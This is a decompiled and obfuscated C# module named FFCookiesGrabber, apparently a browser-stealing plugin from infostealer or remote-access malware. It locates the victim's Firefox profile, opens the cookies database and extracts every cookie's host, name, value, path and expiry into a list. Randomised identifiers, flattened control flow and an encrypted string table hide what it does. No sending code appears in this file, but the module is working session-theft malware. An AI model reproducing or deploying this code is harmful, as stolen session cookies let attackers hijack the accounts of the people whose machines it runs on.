using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using HsZcU78F13T1yLWI1V;
using UY3BiEArlp6B4GPt9k;

namespace Plugin.Browsers.Firefox.Cookies;

public class FFCookiesGrabber
{
	public class FirefoxCookie
	{
		[CompilerGenerated]
		private string _003CHost_003Ek__BackingField;

		[CompilerGenerated]
		private string _003CName_003Ek__BackingField;

		[CompilerGenerated]
		private string _003CValue_003Ek__BackingField;

		[CompilerGenerated]
		private string _003CPath_003Ek__BackingField;

		[CompilerGenerated]
		private DateTime _003CExpiresUTC_003Ek__BackingField;

		[CompilerGenerated]
		private bool _003CSecure_003Ek__BackingField;

		[CompilerGenerated]
		private bool _003CHttpOnly_003Ek__BackingField;

		[CompilerGenerated]
		private bool _003CExpired_003Ek__BackingField;

		private static FirefoxCookie vYbOasmYENLsmiL3nkg;

		public string Host
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CHost_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 1:
						_003CHost_003Ek__BackingField = value;
						num2 = 0;
						if (b6i4cDmSnrbimV5A647() == null)
						{
							num2 = 0;
						}
						break;
					case 0:
						return;
					}
				}
			}
		}

		public string Name
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CName_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 1:
							break;
						case 0:
							return;
						}
						_003CName_003Ek__BackingField = value;
						num2 = 0;
					}
					while (wTEMJfmavdoklpev4Cs());
				}
			}
		}

		public string Value
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CValue_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 1:
						_003CValue_003Ek__BackingField = value;
						num2 = 0;
						if (!wTEMJfmavdoklpev4Cs())
						{
							num2 = 0;
						}
						break;
					case 0:
						return;
					}
				}
			}
		}

		public string Path
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CPath_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 0:
							return;
						case 1:
							break;
						}
						_003CPath_003Ek__BackingField = value;
						num2 = 0;
					}
					while (b6i4cDmSnrbimV5A647() == null);
				}
			}
		}

		public DateTime ExpiresUTC
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CExpiresUTC_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 0:
						return;
					case 1:
						_003CExpiresUTC_003Ek__BackingField = value;
						num2 = 0;
						if (wTEMJfmavdoklpev4Cs())
						{
							num2 = 0;
						}
						break;
					}
				}
			}
		}

		public bool Secure
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CSecure_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 1:
						_003CSecure_003Ek__BackingField = value;
						num2 = 0;
						if (!wTEMJfmavdoklpev4Cs())
						{
							num2 = 0;
						}
						break;
					case 0:
						return;
					}
				}
			}
		}

		public bool HttpOnly
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CHttpOnly_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				int num2 = num;
				while (true)
				{
					switch (num2)
					{
					default:
						return;
					case 1:
						_003CHttpOnly_003Ek__BackingField = value;
						num2 = 0;
						if (b6i4cDmSnrbimV5A647() != null)
						{
							num2 = 0;
						}
						break;
					case 0:
						return;
					}
				}
			}
		}

		public bool Expired
		{
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			get
			{
				return _003CExpired_003Ek__BackingField;
			}
			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			set
			{
				int num = 1;
				while (true)
				{
					int num2 = num;
					do
					{
						switch (num2)
						{
						default:
							return;
						case 1:
							break;
						case 0:
							return;
						}
						_003CExpired_003Ek__BackingField = value;
						num2 = 0;
					}
					while (b6i4cDmSnrbimV5A647() == null);
				}
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public override string ToString()
		{
			return (string)tvaQGYmL6vUa5kJsyMJ(JcY1TDmg666qQNIsXYw(1938), new object[8]
			{
				z9yiTPmCyQVWWLTRUoK(xhf0UNcTnQ6uV2PN1fR.CT3coPxqoL),
				Host,
				Name,
				Value,
				Path,
				Expired,
				HttpOnly,
				Secure
			}, fetuKccsNuZNWhB9rD4.mtfc6Bk2HM);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public FirefoxCookie()
		{
			lQAXXhm5LQEqMM12Eoc();
			base._002Ector();
			int num = 0;
			if (1 == 0)
			{
				num = 0;
			}
			switch (num)
			{
			case 0:
				break;
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static bool wTEMJfmavdoklpev4Cs()
		{
			return vYbOasmYENLsmiL3nkg == null;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static FirefoxCookie b6i4cDmSnrbimV5A647()
		{
			return vYbOasmYENLsmiL3nkg;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static object JcY1TDmg666qQNIsXYw(int P_0)
		{
			return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static object z9yiTPmCyQVWWLTRUoK(object P_0)
		{
			return xhf0UNcTnQ6uV2PN1fR.IrTxr5idK((xhf0UNcTnQ6uV2PN1fR)P_0);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static object tvaQGYmL6vUa5kJsyMJ(object P_0, object P_1, object P_2)
		{
			return fetuKccsNuZNWhB9rD4.IrTxr5idK((string)P_0, (object[])P_1, (fetuKccsNuZNWhB9rD4)P_2);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		internal static void lQAXXhm5LQEqMM12Eoc()
		{
			WkMgYHbfSUMGdoITRx.meR4IDkzWCCfY();
		}
	}

	private static DirectoryInfo firefoxProfilePath;

	private static FileInfo firefoxCookieFile;

	private static FFCookiesGrabber eETWSgmU0SX5GaTvkqO;

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static void Init_Path()
	{
		int num = 5;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					return;
				case 4:
					if (firefoxProfilePath != null)
					{
						num2 = 6;
						continue;
					}
					goto case 2;
				case 5:
					firefoxProfilePath = (DirectoryInfo)IyfjVTmjIK5rtGOUOpP();
					num2 = 4;
					if (OdeOqSm8HZ6MJxFqOY2() == null)
					{
						continue;
					}
					break;
				case 2:
					throw new NullReferenceException((string)PpyxnXmlZWmUu72Vgsg(1232));
				case 6:
					firefoxCookieFile = (FileInfo)sQSNwBmkPfbKdkwE4Ru(firefoxProfilePath, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1360));
					num2 = 1;
					if (OdeOqSm8HZ6MJxFqOY2() == null)
					{
						continue;
					}
					break;
				case 1:
					if (firefoxCookieFile != null)
					{
						num2 = 0;
						if (I5qdhLmp16eLLG0YPih())
						{
							continue;
						}
						break;
					}
					goto case 3;
				case 3:
					throw new NullReferenceException((string)PpyxnXmlZWmUu72Vgsg(1392));
				case 0:
					return;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static List<FirefoxCookie> Cookies()
	{
		Init_Path();
		List<FirefoxCookie> list = new List<FirefoxCookie>();
		SQLiteHandler sQLiteHandler = new SQLiteHandler(JB4J6pqWfLbCbJXTau.IrTxr5idK(firefoxCookieFile, JB4J6pqWfLbCbJXTau.ABdcj1bZp7));
		if (!sQLiteHandler.ReadTable(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1470)))
		{
			throw new Exception(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1496));
		}
		int rowCount = sQLiteHandler.GetRowCount();
		for (int i = 0; i < rowCount; i++)
		{
			try
			{
				string value = sQLiteHandler.GetValue(i, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1554));
				string value2 = sQLiteHandler.GetValue(i, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1566));
				string value3 = sQLiteHandler.GetValue(i, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1578));
				string value4 = sQLiteHandler.GetValue(i, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1592));
				bool secure = !xaHR5Px3RNdNB4LsQbl.IrTxr5idK(sQLiteHandler.GetValue(i, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1604)), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1624), xaHR5Px3RNdNB4LsQbl.zaGxaKrUPr);
				bool httpOnly = !xaHR5Px3RNdNB4LsQbl.IrTxr5idK(sQLiteHandler.GetValue(i, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1604)), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1624), xaHR5Px3RNdNB4LsQbl.zaGxaKrUPr);
				long num = Kr7d4GcbkwIsuXtqyAr.IrTxr5idK(sQLiteHandler.GetValue(i, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1630)), Kr7d4GcbkwIsuXtqyAr.kKecNUGfYg);
				long num2 = ToUnixTime(mpKVGUcwt4WGMvZM0ft.IrTxr5idK(mpKVGUcwt4WGMvZM0ft.EstcCtnukX));
				DateTime expiresUTC = FromUnixTime(num);
				bool expired = num2 > num;
				list.Add(new FirefoxCookie
				{
					Host = value,
					ExpiresUTC = expiresUTC,
					Expired = expired,
					Name = value2,
					Value = value3,
					Path = value4,
					Secure = secure,
					HttpOnly = httpOnly
				});
			}
			catch (Exception)
			{
				return list;
			}
		}
		return list;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static DateTime FromUnixTime(long unixTime)
	{
		int num = 1;
		int num2 = num;
		DateTime dateTime = default(DateTime);
		while (true)
		{
			switch (num2)
			{
			default:
				return mSWmAxceoX01Sh0EOZU.IrTxr5idK(ref dateTime, unixTime, mSWmAxceoX01Sh0EOZU.sHtchBUGJv);
			case 1:
				dateTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
				num2 = 0;
				if (I5qdhLmp16eLLG0YPih())
				{
					num2 = 0;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static long ToUnixTime(DateTime value)
	{
		int num = 1;
		int num2 = num;
		TimeSpan timeSpan = default(TimeSpan);
		while (true)
		{
			switch (num2)
			{
			default:
				return (long)ICT5SscOKK9P7MDqKsr.IrTxr5idK(ref timeSpan, ICT5SscOKK9P7MDqKsr.LIFc4jDNti);
			case 1:
			{
				DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0);
				timeSpan = ugWm33cm9pPdFnfmcvv.IrTxr5idK(value, huLkOUcIhOkjvb2ROtU.IrTxr5idK(ref dateTime, huLkOUcIhOkjvb2ROtU.QODcSBc5H1), ugWm33cm9pPdFnfmcvv.WUBcXtjyr4);
				num2 = 0;
				if (I5qdhLmp16eLLG0YPih())
				{
					num2 = 0;
				}
				break;
			}
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static FileInfo GetFile(object profilePath, object searchTerm)
	{
		int num = 1;
		FileInfo[] array = default(FileInfo[]);
		int num3 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 4:
					throw new Exception((string)PpyxnXmlZWmUu72Vgsg(1646));
				case 3:
					return array[num3];
				case 2:
					if (num3 >= array.Length)
					{
						num2 = 4;
						continue;
					}
					goto case 3;
				case 1:
					array = (FileInfo[])E764DamWkuUyuTMhyWA(profilePath, searchTerm, eew2ltc5j2nLtB9B8Sw.zaIcLZ4m4S);
					num2 = 0;
					if (OdeOqSm8HZ6MJxFqOY2() == null)
					{
						continue;
					}
					break;
				default:
					num3 = 0;
					num2 = 2;
					if (OdeOqSm8HZ6MJxFqOY2() == null)
					{
						continue;
					}
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static DirectoryInfo GetProfilePath()
	{
		object obj = CXQvuam2C1K7DMAd10F(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), PpyxnXmlZWmUu72Vgsg(1714), Dj4213xogb3ONhNxwgn.lxIxsGwLmk);
		if (!FYgC7vmI7qBYAfJU6h8(obj, fiM4Hw9Fl6DhXSwmaZ.vhxxfQtba8))
		{
			throw new Exception(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1768));
		}
		object obj2 = vvHVwhmQuj1riCr3UtF(new DirectoryInfo((string)obj), pepUA3cfMQ75NxHBYtv.qOacAiYt0K);
		if (((Array)obj2).Length == 0)
		{
			throw new IndexOutOfRangeException(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(1866));
		}
		return (DirectoryInfo)((object[])obj2)[0];
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public FFCookiesGrabber()
	{
		WkMgYHbfSUMGdoITRx.meR4IDkzWCCfY();
		base._002Ector();
		int num = 0;
		if (false)
		{
			int num2;
			num = num2;
		}
		switch (num)
		{
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object IyfjVTmjIK5rtGOUOpP()
	{
		return GetProfilePath();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object PpyxnXmlZWmUu72Vgsg(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object sQSNwBmkPfbKdkwE4Ru(object P_0, object P_1)
	{
		return GetFile(P_0, P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool I5qdhLmp16eLLG0YPih()
	{
		return eETWSgmU0SX5GaTvkqO == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static FFCookiesGrabber OdeOqSm8HZ6MJxFqOY2()
	{
		return eETWSgmU0SX5GaTvkqO;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object E764DamWkuUyuTMhyWA(object P_0, object P_1, object P_2)
	{
		return eew2ltc5j2nLtB9B8Sw.IrTxr5idK(P_0, (string)P_1, (eew2ltc5j2nLtB9B8Sw)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object CXQvuam2C1K7DMAd10F(object P_0, object P_1, object P_2)
	{
		return Dj4213xogb3ONhNxwgn.IrTxr5idK((string)P_0, (string)P_1, (Dj4213xogb3ONhNxwgn)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool FYgC7vmI7qBYAfJU6h8(object P_0, object P_1)
	{
		return fiM4Hw9Fl6DhXSwmaZ.IrTxr5idK((string)P_0, (fiM4Hw9Fl6DhXSwmaZ)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object vvHVwhmQuj1riCr3UtF(object P_0, object P_1)
	{
		return pepUA3cfMQ75NxHBYtv.IrTxr5idK(P_0, (pepUA3cfMQ75NxHBYtv)P_1);
	}
}
